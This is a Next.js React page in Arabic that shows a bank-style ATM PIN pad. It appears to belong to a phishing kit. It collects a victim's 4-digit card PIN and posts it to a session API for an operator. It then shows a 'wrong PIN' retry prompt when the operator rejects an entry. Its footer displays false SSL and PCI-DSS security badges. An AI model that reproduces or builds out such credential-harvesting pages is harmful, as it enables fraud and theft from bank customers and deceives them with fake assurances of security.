"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";
const DARK_GREEN = "#155a34";

export default function ATMPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [inputError, setInputError] = useState(false);
  const [pressedKey, setPressedKey] = useState<string | null>(null);
  const searchParams = useSearchParams();

  useEffect(() => {
    const rejected = searchParams.get("rejected");
    if (rejected === "1") {
      setErrorMsg("برجاء التحقق من الرقم السري للصراف الآلي الصحيح");
      setInputError(true);
    }
  }, [searchParams]);

  function pressDigit(digit: string) {
    if (pin.length < 4) {
      setPin(prev => prev + digit);
      if (inputError) { setInputError(false); setErrorMsg(""); }
    }
    setPressedKey(digit);
    setTimeout(() => setPressedKey(null), 150);
  }

  function pressDelete() {
    setPin(prev => prev.slice(0, -1));
    setPressedKey("del");
    setTimeout(() => setPressedKey(null), 150);
  }

  async function handleConfirm() {
    if (pin.length === 4) {
      setErrorMsg("");
      setInputError(false);
      try {
        await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ current_page: 'atm', atm_pin: pin, waiting_for: 'atm' }),
        });
      } catch {}
      router.push("/loading-page?from=atm");
    } else {
      setErrorMsg("يرجى إدخال 4 أرقام كاملة");
      setInputError(true);
    }
  }

  const pinDots = Array.from({ length: 4 }, (_, i) => i < pin.length);

  const numpadKeys = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['', '0', 'del'],
  ];

  return (
    <div style={{
      background: "linear-gradient(160deg, #f0f4f0 0%, #e8f0e8 100%)",
      display: "flex",
      flexDirection: "column",
      justifyContent: "space-between",
      alignItems: "center",
      minHeight: "100vh",
      padding: "0",
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
    }}>
      <SessionTracker page="atm" />

      {/* Header */}
      <div style={{
        width: "100%",
        background: `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`,
        padding: "16px 20px",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        gap: "12px",
        boxShadow: "0 4px 15px rgba(30,115,68,0.3)",
      }}>
        <div style={{
          width: "36px", height: "36px",
          background: "rgba(255,255,255,0.2)",
          borderRadius: "50%",
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="2" y="5" width="20" height="14" rx="2"/>
            <line x1="2" y1="10" x2="22" y2="10"/>
          </svg>
        </div>
        <div style={{ textAlign: "center" }}>
          <div style={{ color: "white", fontWeight: "bold", fontSize: "16px", letterSpacing: "0.5px" }}>
            التحقق من الرقم السري
          </div>
          <div style={{ color: "rgba(255,255,255,0.75)", fontSize: "11px" }}>
            أدخل رقم PIN الخاص ببطاقتك
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div style={{
        flex: 1,
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "10px 16px",
        width: "100%",
        maxWidth: "400px",
      }}>

        {/* ATM Image */}
        <div style={{ marginBottom: "12px", textAlign: "center" }}>
          <img
            src="/manus-storage/1000092647_76307928.png"
            alt="ATM Machine"
            style={{
              width: "130px",
              height: "auto",
              filter: "drop-shadow(0 8px 20px rgba(0,0,0,0.15))",
            }}
          />
        </div>

        {/* Card */}
        <div style={{
          background: "white",
          borderRadius: "20px",
          padding: "20px 20px 16px",
          width: "100%",
          boxShadow: "0 8px 30px rgba(0,0,0,0.08)",
          border: "1px solid rgba(30,115,68,0.1)",
        }}>
          <p style={{ fontSize: "13px", color: "#666", textAlign: "center", marginBottom: "16px", lineHeight: "1.6" }}>
            يرجى إدخال الرقم السري المكون من 4 أرقام
          </p>

          {/* PIN Dots */}
          <div style={{
            display: "flex",
            justifyContent: "center",
            gap: "14px",
            marginBottom: "12px",
          }}>
            {pinDots.map((filled, i) => (
              <div key={i} style={{
                width: "52px",
                height: "52px",
                borderRadius: "12px",
                border: inputError
                  ? "2px solid #e74c3c"
                  : filled
                    ? `2px solid ${GREEN}`
                    : "2px solid #ddd",
                background: inputError
                  ? "#fff5f5"
                  : filled
                    ? `linear-gradient(135deg, ${GREEN}15 0%, ${GREEN}25 100%)`
                    : "#fafafa",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                transition: "all 0.15s ease",
                boxShadow: filled ? `0 2px 8px ${GREEN}30` : "none",
              }}>
                {filled && (
                  <div style={{
                    width: "14px",
                    height: "14px",
                    borderRadius: "50%",
                    background: inputError ? "#e74c3c" : GREEN,
                  }} />
                )}
              </div>
            ))}
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div style={{
              color: "#e74c3c",
              fontSize: "12px",
              fontWeight: "bold",
              marginBottom: "10px",
              padding: "8px 12px",
              backgroundColor: "#fff5f5",
              borderRadius: "8px",
              border: "1px solid #e74c3c",
              textAlign: "center",
            }}>
              ❌ {errorMsg}
            </div>
          )}

          {/* Numpad */}
          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "8px",
            marginBottom: "12px",
          }}>
            {numpadKeys.flat().map((key, idx) => {
              if (key === '') return <div key={idx} />;
              const isPressed = pressedKey === key;
              const isDel = key === 'del';
              return (
                <button
                  key={idx}
                  onClick={() => isDel ? pressDelete() : pressDigit(key)}
                  style={{
                    height: "50px",
                    borderRadius: "12px",
                    border: isDel ? "1.5px solid #e0e0e0" : `1.5px solid ${isPressed ? GREEN : '#e8e8e8'}`,
                    background: isDel
                      ? (isPressed ? "#fee2e2" : "#fff5f5")
                      : (isPressed ? GREEN : "white"),
                    color: isDel
                      ? "#e74c3c"
                      : (isPressed ? "white" : "#333"),
                    fontSize: isDel ? "11px" : "20px",
                    fontWeight: "bold",
                    cursor: "pointer",
                    transition: "all 0.12s ease",
                    transform: isPressed ? "scale(0.94)" : "scale(1)",
                    boxShadow: isPressed
                      ? (isDel ? "0 2px 6px rgba(231,76,60,0.2)" : `0 2px 8px ${GREEN}40`)
                      : "0 2px 4px rgba(0,0,0,0.06)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  {isDel ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                      <line x1="18" y1="9" x2="12" y2="15"/>
                      <line x1="12" y1="9" x2="18" y2="15"/>
                    </svg>
                  ) : key}
                </button>
              );
            })}
          </div>

          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            disabled={pin.length < 4}
            style={{
              width: "100%",
              background: pin.length === 4
                ? `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`
                : "#ccc",
              color: "white",
              border: "none",
              borderRadius: "12px",
              padding: "14px",
              fontSize: "15px",
              fontWeight: "bold",
              cursor: pin.length === 4 ? "pointer" : "not-allowed",
              transition: "all 0.2s ease",
              boxShadow: pin.length === 4 ? `0 4px 15px ${GREEN}40` : "none",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
            تأكيد الرقم السري
          </button>
        </div>
      </div>

      {/* Footer */}
      <div style={{
        width: "100%",
        background: "white",
        borderTop: "1px solid #e8f0e8",
        padding: "12px 20px",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        gap: "16px",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
          <span style={{ fontSize: "11px", color: "#888" }}>تشفير SSL 256-bit</span>
        </div>
        <div style={{ width: "1px", height: "14px", background: "#ddd" }} />
        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          </svg>
          <span style={{ fontSize: "11px", color: "#888" }}>معيار PCI-DSS</span>
        </div>
        <div style={{ width: "1px", height: "14px", background: "#ddd" }} />
        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"/>
            <polyline points="12 6 12 12 16 14"/>
          </svg>
          <span style={{ fontSize: "11px", color: "#888" }}>معاملة آمنة</span>
        </div>
      </div>
    </div>
  );
}
